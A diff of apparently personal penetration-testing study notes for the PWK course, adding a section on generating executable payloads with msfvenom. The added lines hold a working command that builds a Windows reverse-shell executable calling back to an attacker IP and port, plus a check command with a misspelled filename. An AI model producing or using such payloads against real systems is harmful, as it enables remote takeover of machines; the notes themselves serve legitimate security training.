@@ -2647,7 +2647,13 @@ In production environments, domains typically have more than one domain controll
        
     + There are also non-meterpreter payloads available in the MSF.
       
-*** Executable Payloads
+*** Executable Payloads (PWK p696)(msfvenom: export the MSF payloads into various formats)
+    + src:
+      #+begin_src sh
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o shell_reverse.exe
+  # -p <payload>, params, -f <output-format>, -o <output file name>
+file rhell_reverse.exe
+      #+end_src
 
 
 * TODO list
